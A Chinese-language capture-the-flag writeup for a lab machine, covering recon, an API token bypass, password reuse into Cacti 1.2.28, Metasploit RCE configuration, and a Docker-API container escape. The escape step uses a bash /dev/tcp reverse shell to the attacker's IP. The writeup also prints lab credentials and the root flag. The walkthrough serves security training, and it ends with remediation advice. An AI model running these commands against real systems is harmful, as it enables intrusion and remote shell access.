---

# MonitorsFour 渗透测试 Writeup

**目标:** `10.129.30.51`  
**域名:** `monitorsfour.htb`  
**子域名:** `cacti.monitorsfour.htb`

---

## 信息搜集

### 端口扫描

基础端口扫描发现开放服务：

| Port | Service            | 说明             |
| ---: | ------------------ | ---------------- |
|   80 | HTTP / nginx + PHP | Web 主站         |
| 5985 | WinRM              | Windows 远程管理 |
|   22 | SSH                | filtered         |

数据库端口扫描结果（均为 filtered）：
```bash
nmap -p 3306,5432,33060 monitorsfour.htb
```
```
3306/tcp   filtered  mysql
5432/tcp   filtered  postgresql
33060/tcp  filtered  mysqlx
```

### 子域名枚举

使用 `ffuf` 进行 vhost fuzzing：
```bash
ffuf -u http://monitorsfour.htb/ \
-H "Host: FUZZ.monitorsfour.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-t 50 -fs 138
```

发现子域名：**cacti.monitorsfour.htb**

添加 hosts：
```bash
echo "10.129.30.51 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

### 敏感文件泄露

主站存在 `.env` 泄露，获取数据库凭据：
```
DB Username: monitorsdbuser
DB Password: f37p2j8f4t0r
```

---

## 主站漏洞利用

### 1. API Token 认证绕过

发现主站 API 存在 token 校验缺陷：
```http
GET /api/v1/users?token=0
```

通过 `token=0` 可绕过认证并获取用户数据，泄露用户名和密码哈希。

### 2. 密码哈希破解

API 泄露的用户密码为 MD5 哈希。使用 `john` 或 `hashcat` 破解后得到：
```
admin : wonderful1
```

### 3. 主站后台登录

使用破解出的凭据登录主站后台：
```
admin / wonderful1
```
成功进入 `/admin/dashboard`。

---

## Cacti 访问与利用

### 1. Cacti 登录

尝试凭据复用后，发现 Cacti 用户可登录：
```
marcus / wonderful1
```

访问 `http://cacti.monitorsfour.htb/cacti/` 成功登录 Cacti Console。

### 2. Cacti 版本确认

页面显示版本：**Version 1.2.28**

Metasploit 中存在对应模块：
```
exploit/multi/http/cacti_graph_template_rce
```

### 3. Metasploit 利用配置

```bash
use exploit/multi/http/cacti_graph_template_rce
set RHOSTS cacti.monitorsfour.htb
set RPORT 80
set SSL false
set TARGETURI /cacti/
set USERNAME marcus
set PASSWORD wonderful1
set TARGET Linux
set SRVHOST 10.10.17.78
set SRVPORT 8000
set LHOST 10.10.17.78
set LPORT 1234
run
```

成功获得 Meterpreter 会话：
```
[*] Meterpreter session 1 opened (10.10.17.78:1234 -> 10.129.30.51:52459)
```

---

## 容器内枚举

进入 shell，当前用户为 `www-data`，主机名类似 Docker 容器。

### 1. 读取 Cacti 配置文件

```bash
cat /var/www/html/cacti/include/config.php
```

获得数据库配置：
```php
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'mariadb';
$database_username = 'cactidbuser';
$database_password = '7pyrf6ly8qx4';
$database_port     = '3306';
```

### 2. 连接 MariaDB

```bash
mysql -h mariadb -u cactidbuser -p'7pyrf6ly8qx4' cacti
```

查询用户表：
```sql
SELECT id, username, password, realm, enabled FROM user_auth;
```

结果：
| id   | username | password       | realm | enabled |
| ---- | -------- | -------------- | ----- | ------- |
| 1    | admin    | $2y$10$wqlo... | 0     | on      |
| 3    | guest    | 43e9a4ab...    | 0     |         |
| 4    | marcus   | $2y$10$bPW...  | 0     | on      |

---

## 容器逃逸

### 1. 发现 Docker API 未授权访问

在容器中发现可访问 Docker Remote API：
```
http://192.168.65.7:2375
```

该接口无需认证，可直接创建和启动容器。

### 2. 创建特权逃逸容器

在 Kali 开监听：
```bash
nc -lvnp 4449
```

通过 Docker API 创建新容器：
```bash
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/create \
  -d '{
    "Image": "docker_setup-nginx-php",
    "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.17.78/4449 0>&1"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    },
    "Tty": true,
    "AttachStdin": true,
    "AttachStdout": true,
    "AttachStderr": true,
    "OpenStdin": true
  }'
```

启动容器：
```bash
curl -X POST \
http://192.168.65.7:2375/containers/<container_id>/start
```

收到 root shell：
```
root@b6a7dbd30f68:/var/www/html#
```

### 3. 读取宿主机文件系统

宿主机根目录被挂载到 `/host`，Windows C 盘位于 `/host/mnt/host/c/`。

读取 root flag：
```bash
cat /host/mnt/host/c/Users/Administrator/Desktop/root.txt
```

获得：
```
97751249f7b008fd0e89dc8a71e678a6
```

---

## 完整攻击链

```
1. 访问主站 monitorsfour.htb
2. 发现 .env 泄露数据库凭据
3. 发现 API token=0 认证绕过
4. 通过 /api/v1/users?token=0 泄露用户数据
5. 破解 MD5 hash，得到 admin / wonderful1
6. 登录主站后台 /admin/dashboard
7. 子域名枚举发现 cacti.monitorsfour.htb
8. 使用 marcus / wonderful1 登录 Cacti 1.2.28
9. 利用 Cacti Graph Template authenticated RCE 获取 www-data shell
10. 读取 Cacti config.php，获得 MariaDB 凭据
11. 发现 Docker API 192.168.65.7:2375 未授权访问
12. 创建 privileged 容器，挂载宿主机根目录到 /host
13. 获得 root 容器 shell
14. 读取 Windows 宿主机 Administrator 桌面的 root.txt
```

---

## 漏洞总结

| 阶段              | 漏洞 / 问题                           | 影响                  |
| ----------------- | ------------------------------------- | --------------------- |
| 信息泄露          | `.env` 可访问                         | 泄露数据库凭据        |
| 认证绕过          | API `token=0`                         | 未授权读取用户数据    |
| 弱口令 / 密码复用 | `wonderful1` 被复用                   | 主站和 Cacti 均可登录 |
| 组件漏洞          | Cacti 1.2.28 Graph Template RCE       | 获取 Web 容器 shell   |
| 敏感配置          | Cacti `config.php` 可被 www-data 读取 | 泄露 MariaDB 凭据     |
| 容器安全          | Docker API 2375 未授权                | 创建特权容器          |
| 容器逃逸          | privileged + host bind mount          | 读取宿主机文件系统    |

---

## 修复建议

### Web 主站
- 禁止 `.env`、备份文件、配置文件通过 Web 访问
- API token 校验必须使用严格类型比较
- 敏感 API 必须强制认证和权限校验
- 不要在 API 响应中返回密码哈希

### 账号与凭据
- 禁止多系统复用同一密码
- 强制修改 `wonderful1` 等弱口令
- 对后台账户启用 MFA
- 数据库账号最小权限化

### Cacti
- 升级 Cacti 至 `1.2.29` 或更高版本
- 限制普通用户修改 Graph Template
- Web 目录禁止写入可执行 PHP 文件

### Docker
- 禁止 Docker Remote API 暴露在 `0.0.0.0:2375` 或内网未认证访问
- 不允许业务容器访问 Docker API
- 禁止随意创建 `Privileged` 容器
- 限制容器挂载宿主机根目录

---

## 关键凭据与结果

| 类型       | 值                                 |
| ---------- | ---------------------------------- |
| 主站后台   | `admin / wonderful1`               |
| Cacti 用户 | `marcus / wonderful1`              |
| Cacti DB   | `cactidbuser / 7pyrf6ly8qx4`       |
| 泄露 DB    | `monitorsdbuser / f37p2j8f4t0r`    |
| Docker API | `192.168.65.7:2375`                |
| root flag  | `97751249f7b008fd0e89dc8a71e678a6` |
